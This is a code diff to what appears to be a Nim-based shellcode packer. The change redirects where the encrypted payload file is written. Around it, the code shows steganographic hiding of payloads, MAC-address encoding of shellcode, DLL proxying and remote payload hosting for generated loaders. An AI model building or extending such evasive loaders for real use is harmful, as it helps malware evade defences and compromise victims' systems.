@@ -1246,10 +1246,20 @@ ectx.init(key)
 ectx.encrypt(plaintext, enctext)
 ectx.clear()
 
-echo "Writing encrypted blob to disk: "
 
 var content: string = cast[string](enctext)
-writeFile(shellcodeFile[0], content)
+# if shellcodeFile[0] contains a PATH with \, we remove the path including the last \ so that the encrypted payload will land in the CWD
+var outStringShellcode: string = ""
+if (shellcodeFile[0].contains("\\")):
+    # replace everything before the last \ with nothing
+    # Get the filename from the path
+    let (_, filename) = splitPath(shellcodeFile[0])
+    outStringShellcode = filename
+else:
+    outStringShellcode = shellcodeFile[0]
+
+echo "Writing encrypted blob to disk: " & outStringShellcode
+writeFile(outStringShellcode, content)
 
 
 ### stego stuff, credit to @OffenseTeacher, https://github.com/OffenseTeacher/Steganim
@@ -1360,7 +1370,7 @@ if(useStego):
         echo "[*] Image Name: " & imageName
 
     var 
-        inputPayload = shellcodeFile[0]
+        inputPayload = outStringShellcode
         inputBaseImage = stegofile
         outputSteganoFile = stegofile
     echo "[*] Creating Stegano Image:"
@@ -1375,11 +1385,11 @@ if(useStego):
 
 if(macPayload):
     echo "[*] Converting Shellcode to MAC-Adresses: "
-    echo fmt"{packerPath}\bin2mac\bin2mac.exe {packerPath}\{shellcodeFile[0]}"
+    echo fmt"{packerPath}\bin2mac\bin2mac.exe {packerPath}\{outStringShellcode}"
     when system.hostOS == "linux":
-        macPayloadString = exec_cmd_ex(fmt"{packerPath}/bin2mac/bin2mac.py {packerPath}/{shellcodeFile[0]}")[0]
+        macPayloadString = exec_cmd_ex(fmt"{packerPath}/bin2mac/bin2mac.py {packerPath}/{outStringShellcode}")[0]
     when system.hostOS == "windows":
-        macPayloadString = exec_cmd_ex(fmt"{packerPath}\bin2mac\bin2mac.exe {packerPath}\{shellcodeFile[0]}")[0]
+        macPayloadString = exec_cmd_ex(fmt"{packerPath}\bin2mac\bin2mac.exe {packerPath}\{outStringShellcode}")[0]
     #echo macPayloadString
 
 
@@ -4524,7 +4534,7 @@ if(exists):
     let msg = fmt"[!] Loader saved to {outfile}"
     echo "\n" & msg
     if(retrieveFromFile):
-        echo fmt"[!] Encrypted Payload saved to {shellcodeFile[0]}"
+        echo fmt"[!] Encrypted Payload saved to {outStringShellcode}"
     if (callobfs):
         when system.hostOS == "windows":
             var outfileonlyname = outfile.replace(packerPath, "")
@@ -4569,7 +4579,7 @@ if(exists):
                 writeFile(fmt"{outfile}",pumpsequence)
 
     if (retrieveFromURL):
-        echo fmt"[!] Make sure to host the {shellcodeFile[0]} file on your webserver with the correct filename to have a working payload ;-)"
+        echo fmt"[!] Make sure to host the {outStringShellcode} file on your webserver with the correct filename to have a working payload ;-)"
 
     if (dllProxy):
         echo fmt"[!] Original DLL saved as {randValue}.dll - you need to copy both files into the target directory to have a working payload ;-)"
